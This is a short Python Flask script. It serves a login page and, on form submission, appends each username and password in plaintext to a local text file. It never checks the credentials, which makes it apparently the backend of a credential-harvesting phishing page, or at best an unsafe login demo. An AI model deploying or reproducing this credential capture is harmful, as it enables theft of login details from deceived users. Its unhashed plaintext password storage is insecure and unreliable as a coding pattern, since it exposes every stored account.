from flask import Flask, render_template, request
import datetime

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        db_ent = open("python_scripts/database/db_1", 'a')     #Opening database file (i.e txt file)
        db_ent.write("\n" + "USERNAME : " + username + "  " + "PASSWORD : " + password)     #writing username : password 
        db_ent.close()
    return render_template('login.html')

# can not be called and execute arbitrary
if __name__ == '__main__':
    app.run()


